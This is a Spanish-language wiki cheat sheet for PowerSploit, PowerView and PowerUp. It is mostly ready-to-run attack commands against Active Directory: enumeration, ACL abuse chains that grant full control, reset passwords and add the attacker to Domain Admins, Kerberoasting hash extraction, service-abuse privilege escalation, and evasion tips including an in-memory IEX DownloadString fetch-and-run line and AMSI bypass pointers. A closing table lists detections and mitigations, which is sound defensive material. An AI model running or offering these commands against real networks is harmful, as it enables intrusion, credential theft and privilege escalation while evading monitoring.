---
title: "PowerSploit / PowerView Cheat Sheet"
category: "AD"
description: "Comandos esenciales para enumeración de Active Directory usando PowerView y PowerSploit."
image: "/images/wiki/2.png"
---

# PowerSploit & PowerView: Reconocimiento de Active Directory

**PowerSploit** es una colección de módulos de Microsoft PowerShell que pueden utilizarse para ayudar a los pentesters durante todas las fases de una evaluación. **PowerView** es su herramienta de reconocimiento más famosa, y **PowerUp** cubre escalamiento de privilegios local.

[Repositorio Oficial (Dev)](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
[Wiki de PowerView](https://powersploit.readthedocs.io/en/latest/)

## Enumeración de Dominio

### Información Básica
*   **Obtener Dominio Actual**: `Get-Domain`
*   **Enumerar Otros Dominios**: `Get-Domain -Domain <DomainName>`
*   **Obtener SID del Dominio**: `Get-DomainSID`
*   **Políticas de Dominio**:
    ```powershell
    Get-DomainPolicy
    # Ver políticas de sistema (contraseñas) y Kerberos
    Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
    Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
    ```
*   **Controladores de Dominio**: `Get-DomainController`

### Usuarios y Grupos
*   **Guardar Usuarios en Archivo**:
    `Get-DomainUser | Out-File -FilePath .\DomainUsers.txt`
*   **Detalles de Usuario Específico**:
    `Get-DomainUser -Identity <User> -Properties DisplayName, MemberOf | Format-List`
*   **Enumerar Grupos**:
    `Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt`
*   **Miembros de Admin de Dominio**:
    `Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberDistinguishedName`

### Computadoras
*   **Listar Computadoras**:
    `Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName`
*   **Computadoras Vivas (Ping)**:
    `Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName`

### OUs (Unidades Organizativas)
*   **Listar todas las OUs**:
    `Get-DomainOU -Properties Name | Sort-Object -Property Name`
*   **Computadoras dentro de una OU**:
    ```powershell
    Get-DomainOU -Identity "OU_Name" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name}
    ```
*   **GPOs aplicadas a una OU**:
    ```powershell
    Get-DomainOU -Identity "OU_Name" | %{Get-DomainGPO -Identity $_.gplink.split(";")[0] -Properties DisplayName}
    ```

### GPOs (Políticas de Grupo)
*   **Listar GPOs**:
    `Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName`
*   **GPOs de una Computadora**:
    `Get-DomainGPO -ComputerIdentity <ComputerName>`
*   **Usuarios en Grupo Admin Local via GPO**:
    `Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>`
*   **GPOs con permisos interesantes (modificables)**:
    ```powershell
    Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}
    ```

## Enumeración de Trusts (Confianzas)

### Trust de Dominio
*   **Listar trusts del dominio actual**:
    `Get-DomainTrust`
*   **Trusts de otro dominio**:
    `Get-DomainTrust -Domain <OtroDominio>`
*   **Mapear todos los dominios del forest**:
    `Get-ForestDomain`
*   **Trusts del forest actual**:
    `Get-ForestTrust`

### Mapeo Cross-Forest
```powershell
# Enumerar trusts del forest completo
Get-ForestDomain -Forest <ForestName> | %{Get-DomainTrust -Domain $_.Name}

# Encontrar usuarios de grupos externos (cross-domain)
Get-DomainForeignGroupMember -Domain <OtroDominio>

# Encontrar usuarios foráneos en el dominio actual
Get-DomainForeignUser
```

## ACLs: Enumeración y Abuso

### Encontrar ACLs Explotables
*   **ACLs de un Usuario**:
    `Get-DomainObjectAcl -Identity <AccountName> -ResolveGUIDs`
*   **ACLs Interesantes (escaneo global)**:
    `Find-InterestingDomainAcl -ResolveGUIDs`
*   **Buscar ACLs donde mi usuario/grupo tiene permisos**:
    ```powershell
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "MiUsuario|MiGrupo"}
    ```
*   **Verificar ACL de un Share**:
    `Get-PathAcl -Path "\\Path\Of\A\Share"`

### Permisos Explotables Comunes

| Permiso | Impacto |
|---------|---------|
| **GenericAll** | Control total sobre el objeto (reset password, modificar grupo, set SPN) |
| **GenericWrite** | Modificar atributos (msDS-AllowedToActOnBehalfOfOtherIdentity, scriptPath, SPN) |
| **WriteOwner** | Cambiar el propietario del objeto (y luego darse permisos completos) |
| **WriteDACL** | Modificar la DACL del objeto (otorgarse GenericAll) |
| **ForceChangePassword** | Resetear la contraseña sin saber la anterior |
| **Self (Self-Membership)** | Agregarse a sí mismo a un grupo |

### Cadena de Abuso de ACLs

```powershell
# 1. WriteDACL: Darnos GenericAll sobre el objeto
Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <MiUsuario> -Rights All

# 2. WriteOwner: Tomar propiedad del objeto primero
Set-DomainObjectOwner -Identity <TargetObject> -OwnerIdentity <MiUsuario>
# Luego darnos WriteDACL y después GenericAll
Add-DomainObjectAcl -TargetIdentity <TargetObject> -PrincipalIdentity <MiUsuario> -Rights All

# 3. ForceChangePassword: Resetear contraseña
$NewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $NewPass

# 4. Self-Membership: Agregarse a un grupo privilegiado
Add-DomainGroupMember -Identity "Domain Admins" -Members <MiUsuario>
```

## Kerberoasting via PowerView

Extraer tickets TGS de cuentas de servicio con SPN configurado para crackearlos offline.

```powershell
# Listar usuarios con SPN (cuentas Kerberoasteables)
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName

# Kerberoasting completo con Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath .\kerberoast_hashes.txt

# Solicitar ticket de un servicio específico
Get-DomainSPNTicket -SPN "MSSQLSvc/srv01.domain.local:1433" -OutputFormat Hashcat
```

### Force Set SPN (Requiere permisos GenericAll/GenericWrite)
Si tienes permisos sobre un usuario, puedes forzarle un SPN para luego atacarlo con Kerberoasting (Targeted Kerberoasting).

```powershell
# Verificar permisos sobre el target
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "MiUsuario"}

# Establecer SPN
Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='ops/whatever1'}

# Kerberoastear el target
Get-DomainSPNTicket -SPN "ops/whatever1" -OutputFormat Hashcat
```

## Funciones de Caza (User Hunting)

### Encontrar Dónde Soy Admin Local
*   **Escaneo general** (ruidoso, toca todas las máquinas):
    `Find-LocalAdminAccess -Verbose`
*   **Verificar acceso admin en máquina específica**:
    `Test-AdminAccess -ComputerName <TargetPC>`

### Localizar Usuarios de Alto Valor
*   **Invoke-UserHunter** (busca sesiones de Domain Admins en máquinas accesibles):
    ```powershell
    Invoke-UserHunter
    Invoke-UserHunter -GroupName "Enterprise Admins"
    ```
*   **Invoke-StealthUserHunter** (consulta menos máquinas, menos ruidoso; revisa servidores de archivos, DC, etc.):
    ```powershell
    Invoke-StealthUserHunter
    Invoke-StealthUserHunter -ShowAll
    ```
*   **Buscar sesiones en una máquina concreta**:
    `Get-NetSession -ComputerName <TargetPC>`
*   **Usuarios logueados en una máquina**:
    `Get-NetLoggedon -ComputerName <TargetPC>`

## Enumeración de Shares

*   **Invoke-ShareFinder** (encuentra shares accesibles en el dominio):
    ```powershell
    Invoke-ShareFinder -Verbose
    Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint
    ```
*   **Invoke-FileFinder** (busca archivos con cadenas interesantes dentro de shares):
    ```powershell
    Invoke-FileFinder -Verbose
    # Buscar archivos con extensiones sensibles
    Invoke-FileFinder -ShareList .\shares.txt -Terms "password","cred","vnc",".config"
    ```
*   **Acceso a shares de un host concreto**:
    `Get-NetShare -ComputerName <TargetPC>`

## Escalamiento de Privilegios Local (PowerUp)

**PowerUp** es el modulo de PowerSploit dedicado a escalamiento de privilegios local en Windows.

```powershell
Import-Module .\PowerUp.ps1
```

### Chequeo Completo
```powershell
# Ejecutar todas las comprobaciones de privesc local
Invoke-AllChecks | Out-File -FilePath .\powerup_results.txt
```

### Vectores que Detecta PowerUp

| Vector | Cmdlet | Descripción |
|--------|--------|-------------|
| Servicios con permisos débiles | `Get-ModifiableService` | Servicios cuyo binario o configuración puedes modificar |
| Unquoted Service Paths | `Get-UnquotedService` | Rutas de servicio sin comillas con espacios (DLL planting) |
| Binarios de servicio modificables | `Get-ModifiableServiceFile` | Puedes sobrescribir el .exe del servicio |
| AlwaysInstallElevated | `Get-RegistryAlwaysInstallElevated` | MSI se instala con SYSTEM si está habilitado |
| Autorun modificable | `Get-ModifiableRegistryAutoRun` | Programas en autorun con permisos de escritura |
| DLL Hijacking | `Find-ProcessDLLHijack` | Procesos vulnerables a DLL hijacking |
| PATH DLL Hijacking | `Find-PathDLLHijack` | Directorios en PATH con escritura |

### Explotación de Servicios Vulnerables
```powershell
# Abusar de un servicio modificable (cambia el binpath a tu payload)
Invoke-ServiceAbuse -Name <ServiceName> -UserName "domain\user"

# Crear servicio con permisos débiles
Install-ServiceBinary -Name <ServiceName>

# Escribir .bat en ruta de servicio no entrecomillada
Write-ServiceBinary -Name <ServiceName> -Path "C:\Program Files\Vulnerable App\service.exe"
```

## Delegación

### Unconstrained Delegation
Descubrir computadoras con delegación no restringida (donde quedan los TGTs de quien se conecte).

```powershell
Get-DomainComputer -Unconstrained -Properties DnsHostName
```

### Constrained Delegation
Descubrir usuarios y computadoras confiados para delegación restringida.

```powershell
Get-DomainUser -TrustedToAuth | Select-Object SamAccountName, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object DnsHostName, msds-allowedtodelegateto
```

### Resource-Based Constrained Delegation (RBCD)
```powershell
# Ver qué objetos pueden delegar a una computadora
Get-DomainComputer <TargetPC> -Properties msds-allowedtoactonbehalfofotheridentity
```

## OPSEC y Evasión

### Bypass de AMSI
PowerSploit es detectado por AMSI (Antimalware Scan Interface) en versiones modernas de PowerShell. Es necesario bypassear AMSI antes de importar los módulos.

```powershell
# Verificar si AMSI está activo (si esto falla, AMSI bloquea)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

> **Nota**: Los bypasses de AMSI específicos cambian constantemente. Consultar recursos actualizados como amsi.fail (uso bajo responsabilidad propia en labs autorizados).

### Detección de ScriptBlock Logging
PowerShell 5+ puede registrar cada bloque de script ejecutado (Event ID 4104).

```powershell
# Verificar si ScriptBlock Logging está habilitado
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue
```

### Ofuscación
*   Usar herramientas como **Invoke-Obfuscation** para ofuscar scripts antes de cargarlos.
*   Renombrar funciones y variables para evitar firmas estáticas.
*   Ejecutar desde memoria en lugar de disco: `IEX (New-Object Net.WebClient).DownloadString('http://...')`

## Detección y Mitigación

| Indicador | Fuente de Log | Descripción |
|-----------|---------------|-------------|
| Importación de PowerView | ScriptBlock Logging (4104) | Registra cmdlets como Get-DomainUser, Invoke-Kerberoast |
| Enumeración LDAP masiva | DC Event Logs | Queries LDAP inusuales desde workstations |
| Invoke-UserHunter | Network (NetSessionEnum) | Llamadas NetSessionEnum excesivas a múltiples hosts |
| Find-LocalAdminAccess | Network (SMB/RPC) | Intentos de conexión admin a muchos hosts |
| Kerberoasting (TGS masivo) | Event ID 4769 | Múltiples solicitudes TGS con RC4 encryption |
| ACL abuse (WriteDACL, etc.) | Event ID 5136 | Modificación de objetos en AD |
| SPN modificado | Event ID 4742 | Cambio de atributo servicePrincipalName |

### Mitigaciones Recomendadas
*   Habilitar **ScriptBlock Logging** y **Module Logging** en PowerShell.
*   Usar **Constrained Language Mode** para restringir PowerShell en endpoints.
*   Implementar **LAPS** para contraseñas de admin local únicas.
*   Monitorizar queries LDAP anómalas desde estaciones de trabajo.
*   Auditar cambios en ACLs y membresías de grupos privilegiados (Event ID 4728, 5136).
*   Reducir cuentas con SPN innecesarios (superficie de Kerberoasting).
*   Aplicar **tiering administrativo** para limitar dónde se exponen credenciales privilegiadas.
